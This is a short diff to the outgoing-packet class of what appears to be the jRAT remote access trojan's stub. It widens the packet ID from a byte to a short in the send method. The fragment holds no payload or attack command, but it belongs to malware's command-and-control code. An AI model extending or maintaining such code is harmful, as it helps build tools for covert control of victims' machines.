+++ Stub/src/se/jrat/stub/packets/outgoing/AbstractOutgoingPacket.java
@@ -13,7 +13,7 @@ public abstract class AbstractOutgoingPacket {
 
 	public synchronized final void send(DataOutputStream dos, StringWriter sw) {
 		try {
-			dos.writeByte(getPacketId());
+			dos.writeShort(getPacketId());
 			this.write(dos, sw);
 		} catch (Exception e) {
 			e.printStackTrace();
